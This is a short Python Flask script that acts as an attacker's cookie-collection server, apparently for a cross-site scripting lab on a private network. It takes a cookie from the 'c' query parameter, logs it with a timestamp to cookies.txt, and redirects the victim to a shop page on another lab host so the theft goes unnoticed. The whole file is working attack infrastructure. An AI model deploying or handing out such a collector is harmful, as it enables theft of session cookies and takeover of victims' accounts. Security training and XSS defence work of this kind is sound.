from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
    cookie = request.args.get('c')
    print(cookie)
    f = open("cookies.txt", "a")
    f.write(cookie+ ''+ str(datetime.now())+ '\n')
    f.close()

    return redirect("http://10.10.10.3:5000/shop.html")


if __name__ == "__main__":
    app.run(host = '10.10.10.2', port=5001)
